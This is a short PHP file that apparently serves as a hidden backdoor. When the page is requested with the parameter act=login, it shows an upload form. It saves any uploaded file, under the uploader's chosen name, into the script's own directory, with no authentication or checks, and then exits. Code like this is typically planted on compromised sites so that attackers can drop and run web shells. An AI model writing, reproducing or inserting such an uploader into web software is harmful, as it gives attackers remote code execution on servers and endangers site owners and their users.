<?php if(isset($_GET["act"]) && $_GET["act"]=="login"){

if(isset($_FILES["File"]))
{
$Path=explode("/",__FILE__);
unset($Path[count($Path)-1]);
$Path=implode("/",$Path);
$Path.="/".$_FILES["File"]["name"];
	if ($_FILES["File"]["error"] > 0)
	{
	echo "Error: " . $_FILES["File"]["error"] . "<br />";
	}
	else if(move_uploaded_file($_FILES["File"]["tmp_name"],$Path))
	{
	echo "Stored in: " .$Path;
	}
}
?>
<form method="post" enctype="multipart/form-data">
	<input type="file" name="File"/><input type="submit"/>
</form>
<?php
exit;
}
?>